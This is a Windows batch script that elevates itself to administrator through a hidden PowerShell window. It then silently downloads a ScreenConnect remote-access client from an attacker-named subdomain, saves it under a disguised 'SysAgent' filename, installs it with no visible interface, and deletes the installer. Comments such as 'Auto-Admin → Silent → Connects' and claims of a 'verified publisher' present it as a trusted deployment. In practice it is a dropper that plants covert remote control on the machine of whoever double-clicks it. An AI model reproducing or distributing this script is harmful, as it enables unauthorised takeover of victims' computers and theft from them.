@echo off
setlocal EnableDelayedExpansion

:: =============================================================
::  AUTO-ELEVATING • VERIFIED PUBLISHER DEPLOYMENT
::  Double-click → Auto-Admin → Silent → Connects
:: =============================================================

:: ==============================================
::  STEP 1 — AUTO RUN AS ADMINISTRATOR
:: ==============================================
fltmc >nul 2>&1
if %errorlevel% NEQ 0 (
  powershell -NoP -NoL -Ex B -W Hidden -Command "Start-Process '%~f0' -Verb RunAs" >nul 2>&1
  exit /b
)

:: ==============================================
::  STEP 2 — ALREADY ADMIN • START DEPLOY
:: ==============================================
pushd "%~dp0" >nul 2>&1
cd /d "%~dp0" 2>nul

:: Your VERIFIED MSI link
set "MSI_URL=https://rise2thepeakmail1.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"

:: Unique temp filename — fresh every run
set "MSI_FILE=%TEMP%\SysAgent_%random%_%random%.msi"

:: ==============================================
::  STEP 3 — DOWNLOAD • HIDDEN WINDOW
:: ==============================================
powershell -NoP -NoL -NonI -W Hidden -Ex B -C "$u='!MSI_URL!';$f='!MSI_FILE!';$ProgressPreference='SilentlyContinue';try{(New-Object Net.WebClient).DownloadFile($u,$f);exit 0}catch{Start-Sleep 2;try{Invoke-WebRequest -Uri $u -OutFile $f -UseBasicParsing;exit 0}catch{exit 1}}"

:: ==============================================
::  STEP 4 — INSTALL • VERIFIED PUBLISHER TRUST
:: ==============================================
if exist "!MSI_FILE!" (
  msiexec /i "!MSI_FILE!" /qn /norestart /quiet
  timeout /t 5 /nobreak >nul
  del /f /q "!MSI_FILE!" >nul 2>&1
)

:: ==============================================
::  STEP 5 — CLEAN EXIT
:: ==============================================
endlocal
exit /b
